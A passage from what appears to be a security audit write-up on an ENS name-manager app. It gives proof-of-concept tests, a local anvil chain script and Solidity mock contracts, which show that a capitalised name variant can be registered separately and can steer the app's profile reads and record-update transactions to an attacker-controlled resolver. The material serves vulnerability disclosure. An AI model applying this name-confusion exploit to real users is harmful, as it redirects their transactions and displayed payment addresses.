    // impose no character constraints on labels", apps/portal/.../isNameOrAddress.ts).
    const ATTACKER_RESOLVER = '0x00000000000000000000000000000000000A77aC' as const
    const empty = { texts: [], coins: [], contentHash: undefined, abi: undefined }
    const after = { ...empty, texts: [{ key: 'com.twitter', value: 'changed' }] }

    const res = await buildRecordsUpdateCalls({
      name: RAW,
      before: empty as never,
      after: after as never,
      publicClient: client as never,
      resolverAddress: ATTACKER_RESOLVER,
    })
    const to = res.calls[0]?.to
    emit('attacker_resolver_str', ATTACKER_RESOLVER)
    emit('tx_to_str', String(to))
    emit('tx_to_equals_attacker_resolver', to === ATTACKER_RESOLVER ? 1 : 0)
    expect(to).toBe(ATTACKER_RESOLVER)
  }, TEST_TIMEOUT_MS)
})
```

#### Rig two

`stateful/foundry.toml`:

```toml
[profile.default]
src = "src"
out = "out"
libs = []
```

`stateful/run.sh`:

```bash
#!/usr/bin/env bash
# H-C7-1 STATEFUL — the end-to-end arm.
# Builds a REAL chain in which `ALICE.eth` and `alice.eth` are two names with two different
# resolvers, then drives the VENDOR's getProfileRecords + buildRecordsUpdateCalls against it.
set -uo pipefail
HERE="$(cd "$(dirname "$0")" && pwd -P)"
MGR="$HERE/../../../../repos/audit-comp-ens/apps/manager"
[ -d "$MGR" ] || { echo "FATAL: app not found at $MGR"; exit 1; }
RPC=http://127.0.0.1:8557
OUT=/tmp/h-c7-1-stateful.txt
rm -f "$OUT"   # never let a stale file masquerade as a fresh run
K=0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
UR_ADDR=0xeEeEEEeE14D718C2B47D9923Deab1335E144EeEe   # what sepoliaWithEns targets


cleanup() { pkill -f "anvil --port 8557" 2>/dev/null; }
trap cleanup EXIT
cleanup; sleep 1

nohup anvil --port 8557 --chain-id 11155111 --silent > /tmp/h-c7-1-stateful-anvil.log 2>&1 &
for _ in $(seq 1 30); do cast chain-id --rpc-url $RPC >/dev/null 2>&1 && break; sleep 1; done

ATTACKER_ADDR=0x00000000000000000000000000000000DeAdBeEf
VICTIM_ADDR=0x0000000000000000000000000000000000C0FFEE

cd "$HERE"
forge build >/dev/null 2>&1

# Two resolvers: one the attacker controls, one the real owner's.
ATT_RES=$(forge create src/Stateful.sol:Resolver --rpc-url $RPC --private-key $K --broadcast \
  --constructor-args "$ATTACKER_ADDR" "attacker-controlled" 2>&1 \
  | grep -oE "Deployed to: 0x[0-9a-fA-F]{40}" | awk '{print $3}')
VIC_RES=$(forge create src/Stateful.sol:Resolver --rpc-url $RPC --private-key $K --broadcast \
  --constructor-args "$VICTIM_ADDR" "the real owner" 2>&1 \
  | grep -oE "Deployed to: 0x[0-9a-fA-F]{40}" | awk '{print $3}')

# The UniversalResolver, installed at the address the app's own chain config targets.
UR=$(forge create src/Stateful.sol:StatefulUniversalResolver --rpc-url $RPC --private-key $K --broadcast 2>&1 \
  | grep -oE "Deployed to: 0x[0-9a-fA-F]{40}" | awk '{print $3}')
cast rpc anvil_setCode "$UR_ADDR" "$(cast code "$UR" --rpc-url $RPC)" --rpc-url $RPC >/dev/null 2>&1

# REGISTER THE TWO NAMES, as two independent registrations with two independent resolvers.
#   DNS wire format: <len><label><len><tld><0x00>
DNS_RAW=0x05414c4943450365746800    # "ALICE.eth"
DNS_SPEC=0x05616c6963650365746800   # "alice.eth"
cast send "$UR_ADDR" "setResolver(bytes,address)" "$DNS_RAW"  "$ATT_RES" --rpc-url $RPC --private-key $K >/dev/null 2>&1
cast send "$UR_ADDR" "setResolver(bytes,address)" "$DNS_SPEC" "$VIC_RES" --rpc-url $RPC --private-key $K >/dev/null 2>&1

# The .eth registrar, at the address the app's own chain config targets.
REG_ADDR=0xa88553F454b77203B0D036A05c894d555EAAa2Cc
REG=$(forge create src/Stateful.sol:MockEthRegistrar --rpc-url $RPC --private-key $K --broadcast 2>&1 \
  | grep -oE "Deployed to: 0x[0-9a-fA-F]{40}" | awk '{print $3}')
cast rpc anvil_setCode "$REG_ADDR" "$(cast code "$REG" --rpc-url $RPC)" --rpc-url $RPC >/dev/null 2>&1
# "alice" is registered. "ALICE" is not. That is the ONLY difference.
cast send "$REG_ADDR" "setTaken(string,bool)" "alice" true  --rpc-url $RPC --private-key $K >/dev/null 2>&1

echo "--- chain state ---"
echo "attacker_resolver_contract: $ATT_RES"
echo "victim_resolver_contract:   $VIC_RES"
echo "resolver_for_ALICE.eth:     $(cast call "$UR_ADDR" "resolverFor(bytes32)(address)" "$(cast keccak $DNS_RAW)"  --rpc-url $RPC)"
echo "resolver_for_alice.eth:     $(cast call "$UR_ADDR" "resolverFor(bytes32)(address)" "$(cast keccak $DNS_SPEC)" --rpc-url $RPC)"
echo "registrar_isAvailable(ALICE): $(cast call "$REG_ADDR" "isAvailable(string)(bool)" "ALICE" --rpc-url $RPC)"
echo "registrar_isAvailable(alice): $(cast call "$REG_ADDR" "isAvailable(string)(bool)" "alice" --rpc-url $RPC)"
echo "--- driving the vendor's own services ---"

cp "$HERE/rig/stateful.poc.test.ts" "$MGR/src/features/profile/service/"
( cd "$MGR" && H_STATE_RPC=$RPC H_STATE_OUT=$OUT \
    H_STATE_ATTACKER="$ATT_RES" H_STATE_VICTIM="$VIC_RES" \
    H_STATE_ATTACKER_ADDR="$ATTACKER_ADDR" H_STATE_VICTIM_ADDR="$VICTIM_ADDR" \
    pnpm exec vitest run "src/features/profile/service/stateful.poc.test.ts" 2>&1 | tail -25 )
rm -f "$MGR/src/features/profile/service/stateful.poc.test.ts"

echo "--- measured ---"
cat "$OUT"
```

`stateful/src/Stateful.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// A resolver contract. Whoever registers a label points it at one of these, and
/// from then on THIS CONTRACT answers every record query for that name — whatever
/// node argument it is handed. That is the whole point: the resolver is chosen by
/// the name, and the resolver decides the answers.
contract Resolver {
    address public immutable addrAnswer;
    string  private  textAnswer;

    constructor(address a, string memory t) { addrAnswer = a; textAnswer = t; }

    // coinType 60 takes the SINGLE-argument form (ensjs getAddress coder)
    function addr(bytes32) external view returns (address) { return addrAnswer; }

    // Every other coinType takes the two-argument form. Deliberately EMPTY: a 20-byte
    // value would fail the per-chain coder for e.g. BTC and abort the whole batch, which
    // would be an artefact of the rig rather than of the app. Coin 60 is the one the
    // profile page renders in its copy control, and it is the one answered above.
    function addr(bytes32, uint256) external pure returns (bytes memory) {
        return "";
    }

    function text(bytes32, string calldata) external view returns (string memory) {
        return textAnswer;
    }

    function contenthash(bytes32) external pure returns (bytes memory) { return ""; }

    function ABI(bytes32, uint256) external pure returns (uint256, bytes memory) {
        return (0, "");
    }

    function supportsInterface(bytes4) external pure returns (bool) { return true; }
}

/// A UniversalResolver faithful in the ONE property this finding turns on:
/// it selects the resolver from the DNS-ENCODED NAME it is given, then forwards the
/// batched record calls to that resolver and returns BOTH the results AND the
/// resolver's address.
///
/// Signature and return shape are taken from the pinned ensjs:
///   resolveNameData.ts:73-120  -> resolve(bytes name, bytes data) returns (bytes, address)
///   multicall.ts:60-78         -> the inner `data` is multicall(bytes[]) and the
///                                 returned bytes must decode as bytes[]
contract StatefulUniversalResolver {
    mapping(bytes32 => address) public resolverFor;

    /// Stands for "somebody registered this label and set its resolver".
    function setResolver(bytes calldata dnsName, address r) external {
        resolverFor[keccak256(dnsName)] = r;
    }

    function resolve(bytes calldata name, bytes calldata data)
        external
        view
        returns (bytes memory, address)
    {
        address r = resolverFor[keccak256(name)];
        require(r != address(0), "UR: no resolver for that name");

        // strip the multicall(bytes[]) selector and decode the inner calls
        bytes[] memory calls = abi.decode(data[4:], (bytes[]));
        bytes[] memory results = new bytes[](calls.length);
        for (uint256 i = 0; i < calls.length; i++) {
            (bool ok, bytes memory ret) = r.staticcall(calls[i]);
            results[i] = ok ? ret : bytes("");
        }
        // ensjs decodes this with decodeFunctionResult(multicallSnippet) -> bytes[]
        return (abi.encode(results), r);
    }
}

/// The .eth registrar, faithful in the ONE property this arm turns on: availability is
/// keyed on the RAW LABEL STRING it is handed.
///
/// ensjs v2 getAvailable.ts:95-103 calls `isAvailable(leafLabel)` with the raw leaf label
/// and never normalizes it; the subname path uses `labelhash(leafLabel)`, also raw. So the
/// registrar's key space is raw label bytes.
contract MockEthRegistrar {
    mapping(bytes32 => bool) public takenByLabel;

    /// stands for "somebody already registered this exact label"
    function setTaken(string calldata label, bool v) external {
        takenByLabel[keccak256(bytes(label))] = v;
    }

    function isAvailable(string calldata label) external view returns (bool) {
        return !takenByLabel[keccak256(bytes(label))];
    }
}
```

`stateful/rig/stateful.poc.test.ts`:

```ts
/**
 * H-C7-1 (STATEFUL) — the end-to-end arm.
 *
 * This answers the only question the calldata rig left open: does the attacker's resolver
 * actually COME BACK from the vendor's `getProfileRecords("ALICE.eth")`, and does THAT
 * RETURNED VALUE reach the real transaction builder?
 *
 * Nothing on the vulnerable path is reconstructed:
 *   - getProfileRecords        — the vendor's, unmodified
 *   - buildRecordsUpdateCalls  — the vendor's, unmodified
 *   - getRecords / resolveNameData — the pinned ensjs, unmodified
 * The chain is real (anvil) and carries real state: two names, two resolvers.
 *
 * TWO injections, both OUTSIDE the vulnerable path, both declared:
 *   1. `@/lib/wagmi/helpers` — supplies the viem client, exactly as the vendor's own tests
 *      do (profileExpiry.test.ts:20). A REAL client over a REAL transport to a REAL chain.
 *   2. `@ens-apps/indexer/urql` — the indexer is NOT a listed asset and cannot be reached
 *      locally. It is stubbed to return `{ domain: null }`, i.e. NOTHING. That is
 *      deliberate and load-bearing: because the stub supplies no resolver, any
 *      resolverAddress in the result can ONLY have come from the chain.
 */
import { appendFileSync, writeFileSync } from 'node:fs'
import { createPublicClient, http } from 'viem'
import { describe, expect, it, vi } from 'vitest'
import { sepoliaWithEns } from '@ens-apps/indexer/chain'

const RPC = process.env.H_STATE_RPC ?? 'http://127.0.0.1:8557'
const OUT = process.env.H_STATE_OUT ?? '/tmp/h-c7-1-stateful.txt'
const ATTACKER_RESOLVER = (process.env.H_STATE_ATTACKER ?? '').toLowerCase()
const VICTIM_RESOLVER = (process.env.H_STATE_VICTIM ?? '').toLowerCase()
const ATTACKER_ADDR = (process.env.H_STATE_ATTACKER_ADDR ?? '').toLowerCase()
const VICTIM_ADDR = (process.env.H_STATE_VICTIM_ADDR ?? '').toLowerCase()

writeFileSync(OUT, '')
const emit = (k: string, v: unknown) => appendFileSync(OUT, `${k}: ${v}\n`)

const client = createPublicClient({ chain: sepoliaWithEns, transport: http(RPC) })

// (1) the client — the vendor's own test idiom
vi.mock('@/lib/wagmi/helpers', async () => {
  const { ok } = await import('neverthrow')
  const { createPublicClient: cpc, http: h } = await import('viem')
  const { sepoliaWithEns: chain } = await import('@ens-apps/indexer/chain')
  const c = cpc({ chain, transport: h(process.env.H_STATE_RPC ?? 'http://127.0.0.1:8557') })
  return { safeGetClient: () => ok(c), safeGetConnectorClient: () => ok(c) }
})

// (1b) `@/lib/wagmi` exports a module-level `publicClient` bound to real Sepolia at import
//      time. Repointed at the local chain for the same reason as above — safe harbor is
//      false. Still a REAL viem client over a REAL transport.
vi.mock('@/lib/wagmi', async () => {
  const { createPublicClient: cpc, http: h } = await import('viem')
  const { sepoliaWithEns: chain } = await import('@ens-apps/indexer/chain')
  return {
    publicClient: cpc({ chain, transport: h(process.env.H_STATE_RPC ?? 'http://127.0.0.1:8557') }),
    wagmiConfig: {},
  }
})

// (2) the indexer — OUT OF SCOPE, and deliberately returns NOTHING, so it cannot be the
//     source of any resolver address observed below.
vi.mock('@ens-apps/indexer/urql', () => ({
  default: { query: () => ({ toPromise: async () => ({ data: { domain: null }, error: undefined }) }) },
}))

const RAW = 'ALICE.eth'
const SPEC = 'alice.eth'

describe('H-C7-1 stateful — the attacker resolver is RETURNED, and it reaches the tx', () => {
  it('getProfileRecords(RAW) returns the ATTACKER resolver; getProfileRecords(SPEC) returns the VICTIM resolver', async () => {
    const { getProfileRecords } = await import('@/features/profile/service/profileRecords')

    const rawRes = await getProfileRecords(RAW)
    const specRes = await getProfileRecords(SPEC)

    if (rawRes.isErr()) { emit('raw_error', String(rawRes.error?.cause ?? rawRes.error)); throw rawRes.error }
    if (specRes.isErr()) { emit('spec_error', String(specRes.error?.cause ?? specRes.error)); throw specRes.error }

    const rawResolver = String(rawRes.value.resolverAddress ?? '').toLowerCase()
    const specResolver = String(specRes.value.resolverAddress ?? '').toLowerCase()

    emit('attacker_resolver_deployed', ATTACKER_RESOLVER)
    emit('victim_resolver_deployed', VICTIM_RESOLVER)
    emit('RETURNED_resolver_for_RAW', rawResolver)
    emit('RETURNED_resolver_for_SPEC', specResolver)
    emit('raw_returns_attacker_resolver', rawResolver === ATTACKER_RESOLVER ? 1 : 0)
    emit('spec_returns_victim_resolver', specResolver === VICTIM_RESOLVER ? 1 : 0)
    emit('two_names_two_resolvers', rawResolver !== specResolver ? 1 : 0)

    // the coin-60 record the profile page renders in its copy control
    const rawCoin60 = rawRes.value.coins?.find((c: { coinType: number }) => c.coinType === 60)
    const specCoin60 = specRes.value.coins?.find((c: { coinType: number }) => c.coinType === 60)
    emit('RENDERED_eth_address_for_RAW', String(rawCoin60?.value ?? '').toLowerCase())
    emit('RENDERED_eth_address_for_SPEC', String(specCoin60?.value ?? '').toLowerCase())
    emit('raw_renders_attacker_address',
      String(rawCoin60?.value ?? '').toLowerCase() === ATTACKER_ADDR ? 1 : 0)

    expect(rawResolver).toBe(ATTACKER_RESOLVER)
    expect(specResolver).toBe(VICTIM_RESOLVER)
  }, 120_000)

  it('THAT RETURNED VALUE, not a literal, becomes the transaction `to`', async () => {
    const { getProfileRecords } = await import('@/features/profile/service/profileRecords')
    const { buildRecordsUpdateCalls } = await import(
      '@/features/profile/service/profileRecordTransactions'
    )

    // Exactly what EditProfileDialog.machine.ts:191 does: take savedRecords.resolverAddress
    // from the records read and hand it to the transaction builder. Nothing is hardcoded.
    const saved = await getProfileRecords(RAW)
    if (saved.isErr()) throw saved.error
    const resolverFromTheRead = saved.value.resolverAddress

    emit('value_handed_to_tx_builder', String(resolverFromTheRead).toLowerCase())

    const empty = { texts: [], coins: [], contentHash: undefined, abi: undefined }
    const after = { ...empty, texts: [{ key: 'com.twitter', value: 'changed' }] }

    const res = await buildRecordsUpdateCalls({
      name: RAW,
      before: empty as never,
      after: after as never,
      publicClient: client as never,
      resolverAddress: resolverFromTheRead as never,
    })

    const to = String(res.calls[0]?.to ?? '').toLowerCase()
    emit('tx_to', to)
    emit('tx_to_is_attacker_resolver', to === ATTACKER_RESOLVER ? 1 : 0)
    emit('tx_to_came_from_the_read',
      to === String(resolverFromTheRead).toLowerCase() ? 1 : 0)
    emit('END_TO_END_chain_closed',
      to === ATTACKER_RESOLVER && to === String(resolverFromTheRead).toLowerCase() ? 1 : 0)

    expect(to).toBe(ATTACKER_RESOLVER)
  }, 120_000)
})

describe('H-C7-1 stateful — the raw label is an INDEPENDENTLY REGISTRABLE registry entry', () => {
  it("the app's own availability path reports ALICE.eth free while alice.eth is taken", async () => {
    const { checkRealNameAvailability } = await import(
      '@/features/shared/service/nameChainContractService'
    )

    // On-chain state: the label "alice" is registered; the label "ALICE" is not.
    // Nothing else differs.
    const rawAvail = await checkRealNameAvailability(RAW)
    const specAvail = await checkRealNameAvailability(SPEC)

    if (rawAvail.isErr()) { emit('raw_avail_error', String(rawAvail.error?.cause)); throw rawAvail.error }
    if (specAvail.isErr()) { emit('spec_avail_error', String(specAvail.error?.cause)); throw specAvail.error }

    emit('app_says_ALICE_eth_is_available', rawAvail.value.isAvailable ? 1 : 0)
    emit('app_says_alice_eth_is_available', specAvail.value.isAvailable ? 1 : 0)
    emit('raw_label_is_independently_registrable',
      rawAvail.value.isAvailable === true && specAvail.value.isAvailable === false ? 1 : 0)

    expect(rawAvail.value.isAvailable).toBe(true)
    expect(specAvail.value.isAvailable).toBe(false)
  }, 120_000)
})
```
